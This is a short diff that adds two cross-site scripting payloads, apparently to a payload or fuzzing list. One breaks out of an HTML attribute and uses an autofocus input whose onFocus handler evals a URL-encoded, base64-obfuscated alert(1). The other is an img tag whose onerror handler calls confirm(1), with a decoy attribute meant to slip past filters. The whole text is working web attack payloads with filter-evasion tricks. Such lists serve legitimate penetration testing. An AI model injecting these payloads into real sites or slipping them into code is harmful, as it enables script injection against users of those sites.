@@ -1,0 +1,4 @@
+"><!--><input%2Fautofocus%2FonFocus%3Deval%3F.((atob)('YWxlcnQoMSk%3D'))>
+
+
+"><img src=x onerrora=confirm() onerror=confirm(1)>
